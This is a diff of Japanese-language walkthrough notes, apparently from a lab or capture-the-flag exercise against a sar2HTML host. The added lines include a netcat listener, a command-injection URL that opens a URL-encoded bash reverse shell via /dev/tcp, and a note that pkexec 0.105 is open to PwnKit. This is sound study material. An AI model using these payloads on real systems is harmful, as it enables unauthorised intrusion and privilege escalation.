@@ -26,17 +26,18 @@
   - `-x`pagerとして読める
   - `-m`fileをダウンロードできる。mirrorと書いてあるが、コピーのこと
 - reverse-shellをする
-  - URLencodeは外部のサイトでないとなぜかダメ
-  - 事前に~/tools/reverse-shell/にurlencodeしたreverse-shellは準備しておく
-  - 順にやっていく、ncはダメ。rmとbashはOK
-  - `http://192.168.56.104/sar2HTML/index.php?plot=;bash~`
+  - Parrotで待ち受ける`nc -nlvp 9001` 
+  - 事前に~/tools/reverse-shell/にurlencodeしたreverse-shellは準備しておく、順にやっていく、ncはダメ。rmとbashはOK
+  - `http://192.168.56.104/sar2HTML/index.php?plot=;bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F192.168.56.104%2F9001+%3C%261%27`
+  - ブラウザのURLのリンクに貼り付ける。スペースがないように気をつける
 
 - 対話シェルにする
 - id
   - www-dataのみ 
   - www-dataなのでsudo -lは期待できない。パスワードが必要
 - SUIDを探す
-  - pkexecがある`version 0.105` 
+  - pkexecがある`version 0.105`
+  - `PwnKit`ができる
 - `ps aux | grep root`
   - だいたいいつものcronとapacheが動いている
   - crontabをチェックしてみる
